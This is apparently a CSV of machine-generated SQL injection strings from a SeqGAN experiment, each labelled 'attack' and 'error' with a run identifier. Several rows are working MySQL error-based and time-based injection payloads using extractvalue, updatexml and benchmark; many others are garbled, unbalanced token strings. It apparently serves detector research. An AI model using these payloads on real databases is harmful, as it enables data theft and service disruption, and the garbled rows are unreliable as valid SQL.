attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1948
attack,"1%'   )    )    AND AND 1559  =  1  (  =  (  (  (  (  1297,concat  (  (  (  (  (  (  1808  =  (  (  0x2e,0x7171706a71,0x7171706a71,  (  2917(  (  (  1297,  (  (  (  0x2e,0x7171706a71,  (  (  (  5000000,mduana  )  (  0x5c,0x7171706a71(  (  0x2e,0x7171706a71,  (  (  select   (  3393,concat  (  (  3393,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  1297  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1949
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1950
attack,"  )  (  extractvalue  (  (  (  7982,concat  (  (  (  (  (  (  (  (  (  0x2e,md5  (  1049  =  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  0x2e,md5  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  2917  =  (  (  1297,1   )    (  extractvalue  (  9627,concat  (  0x2e,0x7171706a71(  (  0x4b774c75   (  e  (  elt  (  1808  =  (  (  0x5c,0x7171706a71,  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1951
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1952
attack,"1' and extractvalue  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  t  (  benchmark  (  1049,concat  (  (  (  0x2e,0x7171706a71,  (  (  (  5000000  (  =  (  (  (  (  (  (  5000000(  (  7982  =  (  (  (    (  (  (  (  (  0x2e,0x7171706a71  (  select   (  1759,  (  benchmark  (  5000000,md5  (  (  3393  =  (  3393,  (  benchmark  (  5000000,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1953
attack,"1%kAND procen FROM utna  )  elt  elt  (  0x2e,0x7171706a71,  (  (  select   (  case 0     (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  1297  =  1759,,  (  5000000,md5  (  1808  =  3393,  (  select   (  elt  (  1759  =  7636  (  7982,1   from d5   (  )   (  (  elt  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1954
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%O%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1955
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1956
attack," AND or extractvalue  (  (  3393,concat  (  (  (  0x2e,concat  (  (  (  0x5c,0x7171706a71,  (  (  select   (  )   (  4660  (  (  elt  (  7982  =  (  7636  (  0x4b774c75   e  (  5433  (  (  (  e  (  e  (  0x2e,0x7171706a71,  (  (  select   (  0x5c)   (  5603   (  1724  )   (  4660  (  (  (  1808  =  (  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  5000000,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1957
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kpnnAFROM",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1958
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1959
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1960
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1961
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""e'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '""  =  "")    and USYSERSNC9338ASWextractvalue3576NA8981   benchmark57771"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""e"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""e anal  )  e  5740  =  (  1808,md5  (  (  0x2e,0x7171706a71,  (  select   (  )  elte  (  elt0 a  )  elt  (  (  1297  =  (  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  (  (  0x5c,0x7171706a71,  (  select   (  el  (  elt  (  0x2e,0x7171706a71,  (  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1962
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1963
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1964
attack,"1%',u  l  (  1297,concat  (  (  (    (  (  (  select   (  ut  (  elt  elt  (  0x4b774c75   end  (  (  8841  =  (  9255,1   )    (  select   (  case 0 from d an   (  (  elt  )  1297  =  6134  (  )  0x4b774c75   (  9667  (  0x5c,0x7171706a71,  (  (  (  select   (  e  (  elte  4774  =  (  3393,1   from dual  )   end  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1965
attack,"1%'  =  'kbdoneal  )  )  )  )   then else cast  (  5406  =  1 else a3217 0 as du 0 d 1724  (  (  elt   (  (  el  (  1759  =  (  3393,,  (  =  (  1297,1   (  DSextractvalue  (  (  9627,concat  (  (  (  0x5c,  (  (  select   (  4415  =  (  2917,1   )    (  extractvalue  (  9627,concat  (  (  0x2e,md5  (  1297,concat  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1966
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  'kjs",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1967
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1968
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""k'  =  'kmbreuanalyse  (  3681  )  (  (  (  0x2e,0x7171706a71,(  (  select   (  elt  1808  =  (  1 as dOdunal  )  7636  )  =  3364  (  =  6134  (  case 0 0 from dual  )   end  (  (  elt  )   (  6166  =  ut  (  5000000,md5  (  (  3393  =  (  (  0x2e,md5    (  (  0x5c,0x7171706a71,  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1969
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhnhn AND m(mhosoleanal  =  4241  (  (  elt  (  1808  =  8083  =  (  1808,m,md5  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  50000001   (  (  (  elt  (  elt  (  2917  =  (  1808,1   )    (  extractvalue  (  (  9627,1   )    )    AND 'i'  =  1 else cast  (  (  ,1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nt  (  e  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1970
attack,"1%""   )    (u in4125 or extractvalue  (  7982,concat  (  (  =  0x2e,md5  (  0x2e,concat  (  (  (  1297,concat  (  (  (  (  benchmark  (  (  (  e  (  0x5c,0x7171706a71,  (  0x4b774c75   (  5603  )  (  1297,md5  (  (  0x4b774c75   (  5777  (  5000000,md5  =  (  9788,1   (  case 0 from d5nal  e  )  )  1297,concat  (  (  0x5c,0x7171706a71,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1971
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1972
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ' fnh(vgvqgzq"" like ""k      l  8295  as    (  select   (  case when  (  (  (  1297  =  3393,md5(  (  0x2e,0x717a767a71  (  select   (  (  eltal  )  e  =  (  (  5000000(  (  (  1808,concat  (  =  (  3393,  (  select   (  el  (  select   (  (  elt  3393  =  8318  (  0x5c,0x7171706a71,  (  5000000(  (  8375  =  (  (  3393,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1973
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1974
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1975
attack,"1%'  =  '' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'b'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1976
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1977
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'e""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""      0x717a767a716581)  #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1978
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1979
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxw'  =  'zlxw'  =  'lq",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1980
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1981
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1982
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1983
attack,"1%""   )    )    AND 'i'  =  9083  2162 and extractvalue  (  (  (  (  =  (  3393,0x7171706a71,  (  (  (  select   (  elt  (  1297  =  (  (  1297,0x7171706a71,md5  (  (  =  3393,1   from dual9667  )   end  (  e  (  1272  =  (  (  7982  =  (  (  (  benchmark  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  5000000(  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1984
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1985
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1986
attack," and updatexml  (  (  (  (  (  1049(  0x2e,0x7171706a71,  (  5000000(  (  (  (  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elte  )  8862  =  (  _  (  m d5  (  0x5c,  (  (  select   (  )  el  (  0x2e,0x7171706a71,  (  select   (  5847   (  1812  (  (  (  6134  )  3364  )   (  (  (  elt  (  elt  (  a  =  3393,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1987
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1988
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1989
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1990
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1991
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1992
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1993
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1994
attack,"/1,extractvalue  (  (  (  (  7982,concat  (  (  (  (  (  (  (  (  (  (  (  (  (  (  =  (  (  (  0x2e,0x7171706a71,  (  (  (  (  select   (  elt  (  3393  =  (  3393,m5  (  (    (  (  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  benchmark  (  (   (  5464  (  (  (  7982  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  9667    =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1995
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1996
attack,"1%""   )    (  case  select   (  case when   (  (  (  case when   (  5433  (  (  elt  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  (  e  (  3393  =  (  (  0x2e,md5  (  =  (  1808,concat  (  (  0x5c,  (  select   (  elt  (  )  3393  =  3393,1   (  8375  (  (  1808,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1997
attack,"1%""   )    pro'  =  'eduanal  eltn  e  (  elt  (  e  (  (  1759  (  7982  (  0x2e,  (  (  5000000,md5  (  (  1 as duanal  )  )  e  =  (  3393,1   or extractvalue  (  (  (  1808,1   )    (  extractvalue  (  (   SELECT dual  )  )   end  (  (  (  el  (  1808  =  (  0x2e,0x7171706a71,  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1998
attack,"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'pc'  =  'kunn5mwxmwnm",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1999
